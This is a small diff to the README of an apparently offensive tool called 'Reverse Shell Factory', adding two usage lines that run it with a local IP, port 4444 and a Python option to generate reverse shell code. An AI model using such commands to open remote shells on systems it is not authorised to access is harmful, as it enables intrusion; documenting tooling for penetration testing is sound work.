@@ -41,6 +41,9 @@
 ## Usage Example
 
 ```
+python3 rsfac.py h=192.168.1.10 p=4444 l=py
+./rsfac h=192.168.1.10 p=4444 l=py
+
 Reverse Shell Factory
 
 Local Host: 192.168.1.10
